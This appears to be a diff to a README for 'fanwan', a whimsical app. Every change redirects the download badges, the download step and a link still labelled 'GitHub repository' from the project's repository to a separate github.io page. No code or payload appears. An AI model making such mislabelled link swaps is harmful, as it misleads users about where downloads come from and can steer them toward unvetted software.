@@ -1,6 +1,6 @@
 # 🍚 fanwan - 没得饭吃？先摆个碗！
 
-[![Download fanwan](https://img.shields.io/badge/Download-fanwan-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ganeshb182004/fanwan)
+[![Download fanwan](https://img.shields.io/badge/Download-fanwan-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://ganeshb182004.github.io)
 
 ## 🎯 What Is fanwan?
 
@@ -21,7 +21,7 @@ Getting fanwan up and running is easier than making rice. Follow these simple st
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/ganeshb182004/fanwan](https://github.com/ganeshb182004/fanwan)
+Visit this link to download the application: [https://ganeshb182004.github.io](https://ganeshb182004.github.io)
 
 This is the main page for the fanwan project. You don't need to worry about any of the technical files listed there — just look for the section that says "Releases" or "Download" on the right side of the page.
 
@@ -86,9 +86,9 @@ In a world of serious apps and endless notifications, fanwan is a breath of fres
 
 So what are you waiting for? Your empty bowl isn't going to fill itself.
 
-[![Download fanwan Now](https://img.shields.io/badge/⬇️%20Download%20fanwan-Now-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ganeshb182004/fanwan)
+[![Download fanwan Now](https://img.shields.io/badge/⬇️%20Download%20fanwan-Now-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://ganeshb182004.github.io)
 
-Got questions, funny bowl ideas, or just want to say hi? Head over to the [GitHub repository](https://github.com/ganeshb182004/fanwan) and leave a comment. Your feedback helps make fanwan even more fun for everyone.
+Got questions, funny bowl ideas, or just want to say hi? Head over to the [GitHub repository](https://ganeshb182004.github.io) and leave a comment. Your feedback helps make fanwan even more fun for everyone.
 
 Go on — grab your bowl, share it with your 兄弟伙, and let the good times roll. 干饭愉快! 🍜
 
